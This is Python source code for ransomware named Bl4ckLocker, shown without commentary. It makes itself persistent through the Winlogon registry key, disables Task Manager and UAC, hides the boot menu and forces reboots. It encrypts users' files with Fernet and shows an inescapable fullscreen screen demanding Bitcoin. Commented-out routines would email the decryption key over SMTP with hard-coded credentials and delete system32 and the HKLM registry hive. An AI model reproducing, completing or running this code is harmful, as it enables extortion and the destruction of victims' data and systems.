
import subprocess
from cryptography.fernet import Fernet
import ntpath
import os
import tkinter
from tkinter import *
from sys import argv
import shutil
import sys
import threading
import random 
import smtplib
import requests

class Bl4ckLocker:
    def __init__(self, path):
        self.path = path
        self.filePath = str(argv[0])
        self.delta = ''
        self.fernet_key = ''
        self.decryption_key = ''
        self.nameFileTkinter = []
        #try:
            #self.request = '\nFrom ' + requests.get('http://ip.42.pl/raw').text
        #except:
            #pass
        self.personalId = ''

    def reboot(self):
        subprocess.Popen('shutdown /r /t 0 /f', shell = True)

    def becomePersistent(self):
        shutil.copy(self.filePath, 'C:\\Windows')
        os.rename('C:\\Windows\\' + ntpath.basename(self.filePath), 'C:\\Windows\\Bl4ckL0ck3r.exe')
        subprocess.Popen('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit /t REG_SZ /d C:\\Windows\\Bl4ckL0ck3r.exe /f', shell = True)
        subprocess.Popen('reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f', shell = True)
        subprocess.Popen('reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f', shell = True)
        subprocess.Popen('bcdedit /set {bootmgr} displaybootmenu no', shell = True)

    def purgeBoot(self):
        subprocess.Popen('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit /t REG_SZ /d C:\\Windows\\system32\\userinit.exe, /f', shell = True)
        subprocess.Popen('reg delete HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /f', shell = True)
        subprocess.Popen('reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f', shell = True)
        subprocess.Popen('bcdedit /set {bootmgr} displaybootmenu yes', shell = True)

    def generatePersonalId(self):
        if 'PersonalId.txt' not in os.listdir('C:\\'):
            with open('C:\\PersonalId.txt', 'w') as personalId:
                letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
                for i in range(20):
                    self.personalId += random.choice(letters)
                personalId.write(self.personalId)
                personalId.close()
        personalId = open('C:\\PersonalId.txt', 'r')
        self.personalId = personalId.read()

    def runLock(self):
        nameFileTkinter = self.nameFileTkinter

        def altF4(event):
            global pressedF4
            pressedF4 = False

        def permanentBlock():
            global pressedF4
            if pressedF4:
                pressedF4 = False

        def unlock():
            key = tkinter.Entry.get(enterKey)
            if bytes(key, encoding='utf8') == self.generateFernetKey():
               self.double_mask_delta_main_function(key, 1, 50)
               root.destroy()
                
        def fileRegistry():
            if 'FileRegistry.txt' not in os.listdir('C:\\'):
                fileRegistry = open('C:\\FileRegistry.txt', 'w')
                for i in range(len(nameFileTkinter)):
                    fileRegistry.write(nameFileTkinter[i] + os.linesep)
            with open('C:\\FileRegistry.txt', 'r') as fileRegistry:
                corruptedFiles.insert(END, fileRegistry.read())

        root = tkinter.Tk()
        pressedF4 = False
        root.configure(bg = 'black')
        root.attributes('-fullscreen', True)
        root.attributes('-topmost', True)
        root.bind('<Alt-F4>', altF4)
        root.protocol('WM_DELETE_WINDOW', permanentBlock)
        root.overrideredirect(True)
        frameGlobal = tkinter.Frame(root, bg = 'black')
        frameGlobal.place(anchor = CENTER, relx = .5, rely = .4)
        info_text = """\nATTENTION!!!\n\nYour personal files has been encrypted\n with a strong military algorithm.\n And your access to the Pc has been locked.\n
        The decryption key is unique so\n it is impossible to recover your files and unlock   \nyour Pc without it.\n
        To get the key:     \nSend 150$ BTC to Bitcoin address:\nXXXXXXXXXXXXXXXXXXX\n Then, contact me at fudbl4ckv@protonmail.com  \nspecifying your personal id.\n
        Good luck!        \n"""
        frame1 = tkinter.Frame(frameGlobal, bg='black', highlightbackground = 'grey', highlightthickness = 2)
        frame1.grid(row = 0, column = 0)
        frame2 = tkinter.Frame(frameGlobal, bg='black', highlightbackground = 'grey', highlightthickness = 2)
        frame2.grid(row = 0, column = 1)
        frame3 = tkinter.Frame(frame1, bg = 'black', highlightbackground = 'grey', highlightthickness=2)
        frame4 = tkinter.Frame(frameGlobal, bg = 'black', highlightbackground = 'grey', highlightthickness=2)
        frame4.grid(row = 1, column = 0, columnspan = 2)
        title = tkinter.Label(frame2, text='\nBl4ckLocker Ransomware', bg='black', fg='red', font=('Calibri', 20, 'bold')).pack()
        t = tkinter.Label(frame2, text = info_text, font = ('Calibri', 12, 'bold'), bg = 'black', fg = 'red').pack()
        Image = tkinter.PhotoImage(file = self.getPath('locker.jpg'))
        ImagePack = tkinter.Label(frame1, image = Image).pack()
        corruptedFilesTxt = tkinter.Label(frame1, font = ('Calibri', 15, 'bold'), text = 'Encrypted Files:', bg = 'black', fg = 'red').pack()
        frame3.pack()
        personalID = tkinter.Label(frame4, text = 'Your Personal ID: ' + self.personalId, bg = 'black', font = ('Calibri', 25, 'bold'), fg = 'red').pack(padx = 110)
        scrollbar = tkinter.Scrollbar(frame3)
        scrollbar.pack(side = RIGHT, fill = Y)
        corruptedFiles = tkinter.Text(frame3, font = ('Calibri', 12, 'bold'), width = 55, height = 10, bg = 'black', fg = 'red', yscrollcommand = scrollbar.set)
        corruptedFiles.pack(padx = 10)
        scrollbar.config(command = corruptedFiles.yview)
        keyText = tkinter.Label(frame1, text = 'KEY:', bg = 'black', fg = 'red', font = ('Calibri', 15, 'bold')).pack(pady = 5)
        enterKey = tkinter.Entry(frame1, background = 'white', fg = 'green', font = ('Calibri', 15, 'bold'), width = 40)
        enterKey.pack(pady = 10)
        button = tkinter.Button(frame1, text = 'Decrypt and Unlock', background = 'grey', command = unlock, font = ('Calibri', 15, 'bold')).pack(pady = 10)
        Image2 = tkinter.PhotoImage(file = self.getPath('lock.jpg'))
        ImagePack = tkinter.Label(frame2, image = Image2, borderwidth = 0).pack()
        fileRegistry()
        root.mainloop()

    def generateFernetKey(self):
        if 'FernetKey.key' not in os.listdir('C:\\'):
            key = Fernet.generate_key()
            with open('C:\\FernetKey.key', 'wb') as keyFile:
                keyFile.write(key)
                keyFile.close()
        return open('C:\\FernetKey.key', 'rb').read()

    def digest_bytes(self, file_data):
        return self.fernet_key.encrypt(file_data)

    def barf_bytes(self, file_data):
        return self.fernet_key.decrypt(file_data)

    def double_mask_delta_main_function(self, delta, control_variable, file_size):
        try:
            self.fernet_key = Fernet(delta)
            for root, directory, files_list in os.walk(self.path):
                if 'appdata' not in root.lower():
                    for files in files_list:
                        try:
                            file_path = os.path.join(root, files)
                            extension = str(os.path.splitext(file_path)[1]).lower()
                            if self.protect_file(file_path) and self.extension_validation(extension, control_variable) and self.maximun_size(file_path, file_size):
                                if control_variable == 0:
                                    self.generate_adamantiun(file_path, self.digest_bytes(self.get_file_bytes(file_path)), control_variable)
                                    self.nameFileTkinter.append(file_path)
                                else:
                                    self.generate_adamantiun(file_path, self.barf_bytes(self.get_file_bytes(file_path)), control_variable)
                        except:
                            pass
        except:
            pass

    def protect_file(self, file_name):
        if os.path.basename(argv[0]) not in file_name and 'FileRegistry.txt' not in file_name and 'PersonalId.txt' not in file_name:
            return True
        else:
            return False

    def extension_validation(self, extension, control_value):
        if control_value == 0:
            if extension in self.valid_extension():
                return True
            else:
                return False
        else:
            if extension == '.bl4ck':
                return True
            else:
                return False

    def maximun_size(self, file_name, size):
        if os.path.getsize(file_name) / 1000000 < size:
            return True
        else:
            return False

    def get_file_bytes(self, file_name):
        with open(file_name, 'rb') as file:
            file_data = file.read()
        return file_data

    def generate_adamantiun(self, file_name, data, control_value):
        new_data = data
        with open(file_name, 'wb') as file:
            file.write(new_data)
        if control_value == 0:
            os.rename(file_name, file_name + '.Bl4ck')
        else:
            os.rename(file_name, file_name.replace('.Bl4ck', ''))

    def valid_extension(self):
        valid_extension = ['.txt', '.aiff', 'aif', '.au', '.avi', '.bat', '.bmp', '.class', '.java',
        '.csv', '.cvs', '.dbf', '.dif', '.doc', '.docx', '.eps', '.exe', '.fm3', '.gif', '.hqx','.htm',
        '.html', '.jpg', '.jpeg', '.mac', '.map', '.mdb', '.mid', '.midi', '.mov', '.qt', '.mtb','.mtw',
        '.pdf', '.png', '.ppt', '.pptx', '.psd', '.qxd', '.ra', '.rtf', '.sit', '.tar', '.tif','.wav',
        '.wk3', 'wks', '.wpd', '.wp5', '.xls', '.xlsw', '.zip', '.rar', '.7z', '.vbs', '.py', 'pl','.css',
        '.jar', '.ico', '.key', '.wallet.dat', '.SQLITE3', '.mp3', '.mp4', '.srt', '.dat', '.php''sql',
        '.c', '.usp', '.db', '.conf', '.dll', '.reg', '.ttf', '.md', '.xml', '.version', '.status',
        '.mar', '.odt', '.xlsx', '.json', '.conf', '.pl', '.sh', '.bak', '.pptx', '.cpp', '.spec',
        '.pyc', '.pyw', '.dtd', '.xsd']
        return valid_extension

    def getPath(self, filename):
        if hasattr(sys, '_MEIPASS'):
            return os.path.join(sys._MEIPASS, filename)
        else:
            return filename

    #def destroySystem(self):
        #dir = '%windir%\\system32\\'
        #subprocess.Popen('takeown /F ' + dir + '/R /D Y', shell = True)
        #subprocess.Popen('icacls ' + dir + '/grant %username%:F T', shell = True)
        #subprocess.Popen('rd /Q /S ' + dir)
        #subprocess.Popen('reg delete HKEY_LOCAL_MACHINE /f', shell = True)

    """def sendData(self):
        try:
            server = smtplib.SMTP('smtp.gmail.com: 587')
            server.starttls()
            server.login('anonymousmasterv@gmail.com', 'anonroot')
            server.sendmail('anonymousmasterv@gmail.com', 'mastervmini@gmail.com', self.request + '\n' + self.personalId + '\n' + str(self.generateFernetKey()))
            server.close()
        except:
            pass"""

    def start(self):
        if 'Windows' not in self.filePath:
            self.becomePersistent()
            self.generatePersonalId()
            #self.sendData()
            self.reboot()
        else:
            self.generatePersonalId()
            threading.Thread(target = self.double_mask_delta_main_function(self.generateFernetKey(), 0, 20)).start()
            self.runLock() 
            self.purgeBoot()
            self.reboot()
            
blackLocker = Bl4ckLocker('C:\\Users')
blackLocker.start()






